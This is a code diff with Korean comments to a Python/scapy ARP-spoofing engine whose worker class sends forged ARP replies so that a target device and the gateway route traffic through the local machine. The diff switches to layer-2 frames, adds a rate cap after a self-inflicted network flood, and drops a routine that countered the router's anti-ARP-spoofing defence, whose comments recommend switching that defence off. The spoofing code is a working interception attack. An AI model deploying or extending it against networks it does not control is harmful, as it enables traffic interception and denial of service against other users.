@@ -23,6 +23,12 @@ from typing import Callable
 
 logger = logging.getLogger("arp_engine")
 
+# 반응형(요청/광고 감지 즉시 응답) 전송의 하드 캡. 원인을 100% 특정 못 했더라도
+# 무슨 일이 있어도 이 주기보다 빠르게 반응 전송이 나갈 수 없게 물리적으로
+# 막아서, 어떤 경로로 루프가 생기든 네트워크를 ARP로 가득 채우는 사고
+# (실제로 한 번 발생해 인터넷이 끊겼음)가 재발하지 않게 한다.
+_MIN_REACTIVE_SEND_INTERVAL_SEC = 0.3
+
 try:
     import scapy  # type: ignore
     from scapy.all import (  # type: ignore
@@ -32,7 +38,7 @@ try:
         conf,
         get_if_addr,
         get_if_hwaddr,
-        send,
+        sendp,
         srp,
     )
 
@@ -50,7 +56,7 @@ except ImportError:  # scapy/Npcap 미설치 환경에서도 이 모듈만은 im
     def get_if_addr(*_a, **_k):  # type: ignore
         raise RuntimeError("scapy가 설치되어 있지 않습니다.")
 
-    def send(*_a, **_k):  # type: ignore
+    def sendp(*_a, **_k):  # type: ignore
         raise RuntimeError("scapy가 설치되어 있지 않습니다.")
 
     def srp(*_a, **_k):  # type: ignore
@@ -58,9 +64,16 @@ except ImportError:  # scapy/Npcap 미설치 환경에서도 이 모듈만은 im
 
 
 def _send_arp_reply(*, dst_ip: str, dst_mac: str, spoofed_src_ip: str, src_mac: str) -> None:
-    """"spoofed_src_ip는 src_mac의 것이다"라고 주장하는 ARP reply를 dst_mac에게 보낸다."""
-    send(
-        ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=spoofed_src_ip, hwsrc=src_mac),
+    """"spoofed_src_ip는 src_mac의 것이다"라고 주장하는 ARP reply를 dst_mac에게 보낸다.
+
+    L2(sendp)로 직접 보낸다 — L3(send)를 쓰면 scapy가 목적지까지 어떻게
+    전달할지 몰라서 자기 나름대로 또 ARP 해석을 시도하는데, 이게 부작용으로
+    진짜 ARP 트래픽을 추가로 만들어낸다. 우리는 이미 dst_mac을 알고 있으니
+    Ethernet 프레임을 직접 만들어서 보내면 이런 부작용 자체가 없다.
+    """
+    sendp(
+        Ether(src=src_mac, dst=dst_mac)
+        / ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=spoofed_src_ip, hwsrc=src_mac),
         verbose=False,
     )
 
@@ -92,6 +105,7 @@ class ArpSpoofWorker:
         self._gateway_mac: str | None = None
         self._sniffer: AsyncSniffer | None = None  # type: ignore[valid-type]
         self._arp_seen_count = 0
+        self._last_reactive_send_at = 0.0
 
     def start(self) -> None:
         if self._thread and self._thread.is_alive():
@@ -111,6 +125,21 @@ class ArpSpoofWorker:
         if restore:
             self._restore()
         logger.info("ARP 스푸핑 중단: %s (%s)", self.target.name, self.target.ip)
+
+    def _reactive_send(self, *, dst_ip: str, dst_mac: str, spoofed_src_ip: str) -> bool:
+        """반응형 전송 하나. 최소 간격보다 빠르면 그냥 건너뛴다(하드 캡).
+        보냈으면 True, 캡에 걸려 건너뛰었으면 False를 돌려준다."""
+        now = time.monotonic()
+        if now - self._last_reactive_send_at < _MIN_REACTIVE_SEND_INTERVAL_SEC:
+            return False
+        self._last_reactive_send_at = now
+        _send_arp_reply(
+            dst_ip=dst_ip,
+            dst_mac=dst_mac,
+            spoofed_src_ip=spoofed_src_ip,
+            src_mac=self._my_mac,
+        )
+        return True
 
     def _on_arp_packet(self, packet) -> None:
         """대상 기기나 게이트웨이가 실제로 ARP 요청을 보내는 순간을 엿듣다가,
@@ -148,43 +177,32 @@ class ArpSpoofWorker:
             if packet.op == 1:
                 if packet.pdst == self.gateway_ip and packet.psrc == self.target.ip:
                     # 대상 기기가 "게이트웨이 어디 있어?" 라고 물어봄 -> 즉시 답한다
-                    _send_arp_reply(
+                    if self._reactive_send(
                         dst_ip=self.target.ip,
                         dst_mac=self.target.mac,
                         spoofed_src_ip=self.gateway_ip,
-                        src_mac=self._my_mac,
-                    )
-                    logger.info(
-                        "ARP 요청 실시간 응답 (%s): 기기가 게이트웨이를 물어봐서 즉시 답변",
-                        self.target.name,
-                    )
+                    ):
+                        logger.info(
+                            "ARP 요청 실시간 응답 (%s): 기기가 게이트웨이를 물어봐서 즉시 답변",
+                            self.target.name,
+                        )
                 elif packet.pdst == self.target.ip and packet.psrc == self.gateway_ip:
                     # 게이트웨이가 "대상 기기 어디 있어?" 라고 물어봄 -> 즉시 답한다
-                    _send_arp_reply(
+                    self._reactive_send(
                         dst_ip=self.gateway_ip,
                         dst_mac=self._gateway_mac,
                         spoofed_src_ip=self.target.ip,
-                        src_mac=self._my_mac,
                     )
                 return
 
-            # op == 2 (is-at): 실제 공유기가 스스로 "내가 게이트웨이다"라고
-            # 광고(gratuitous ARP)하는 걸 목격하면, 그 즉시 우리도 다시
-            # 광고해서 덮어쓴다. 기기가 "누가 물어봤을 때만 답하는" 게 아니라
-            # "마지막으로 받은 광고를 그냥 믿는" 타입이면, 2초 주기로 도는
-            # 우리 광고보다 실제 공유기가 스스로 훨씬 자주(관찰된 사례는
-            # 60ms 간격) 광고해서 이겨버린다 — 공유기가 광고하는 순간마다
-            # 즉시 맞받아쳐서 "마지막 발언자"를 우리로 만드는 게 목적이다.
-            if packet.op == 2 and packet.psrc == self.gateway_ip:
-                _send_arp_reply(
-                    dst_ip=self.target.ip,
-                    dst_mac=self.target.mac,
-                    spoofed_src_ip=self.gateway_ip,
-                    src_mac=self._my_mac,
-                )
-                logger.info(
-                    "실제 게이트웨이 광고 감지 -> 즉시 재광고 (%s)", self.target.name
-                )
+            # op == 2 (is-at) 는 더 이상 반응하지 않는다. 원래 이 부분은 공유기의
+            # "ARP Virus 방어" 기능이 광고를 자주(60ms 간격까지) 반복하며 우리
+            # 스푸핑을 되돌리는 것과 맞서기 위해 넣은 반응형 재광고였다. 그
+            # 방어 기능을 공유기 설정에서 꺼두면(권장 사항) 애초에 이 경쟁 자체가
+            # 없어지므로 더 이상 필요 없고, 오히려 자기 자신의 트래픽을 다시
+            # 감지하는 경로가 하나 늘어나는 것 자체가 위험(실제로 네트워크
+            # 전체가 마비된 사고가 있었음)이라 기능째로 제거한다. 2초 주기
+            # 정기 광고(_spoof_once)만으로 충분하다.
         except Exception as e:  # noqa: BLE001
             logger.warning("ARP 요청 실시간 응답 실패 (%s): %s", self.target.name, e)
 
